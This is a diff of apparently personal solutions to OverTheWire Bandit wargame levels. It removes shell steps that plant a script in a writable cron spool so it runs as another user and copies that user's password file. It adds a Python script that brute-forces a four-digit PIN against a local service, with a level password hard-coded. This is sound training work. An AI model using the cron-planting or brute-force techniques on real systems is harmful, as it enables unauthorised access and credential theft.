@@ -1,17 +1,32 @@
-$ ls /etc/cron.d
-$ cat /etc/cron.d/cronjob_bandit24
-$ cat /usr/bin/cronjob_bandit24.sh
-$ ls -l /var/spool/
-$ mkdir /tmp/8080
-$ cd /tmp/8080
-$ chmod u=rwx,g=rwx,o=rwx /tmp/8080
-$ cat > /tmp/8080/script.sh << EOF
-#!/bin/sh
-cat /etc/bandit_pass/bandit24 /tmp/8080/bandit24
-EOF
-$ chmod u=rwx,g=rwx,o=rwx /tmp/8080/script.sh
-$ cp script.sh /var/spool/bandit24/
-$ sleep 60
-$ cat /tmp/8080/bandit24
+#!/usr/bin/env python
 
-to solve this task we copy the bandit24 password file a folder readable by bandit23. this works because the cron is executed as the bandit24 user
+import sys
+import socket
+
+pincode = 0
+password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("127.0.0.1", 30002))
+    welcome_msg = s.recv(2048)
+    print(welcome_msg.decode())
+
+    while pincode < 10000:
+        pincode_string = str(pincode).zfill(4)
+        message = (password + " " + pincode_string + "\n").encode()
+        s.sendall(message)
+        receive_msg = s.recv(1024).decode()
+
+        if "Correct!" in receive_msg:
+            print("Pin: %s" % pincode_string)
+            print(receive_msg)
+            break
+        elif pincode % 100 == 0:
+            print("Wrong: %s" % pincode_string)
+
+        pincode += 1
+except Exception as e:
+    print("Exception: %s" % e)
+finally:
+    sys.exit(1)
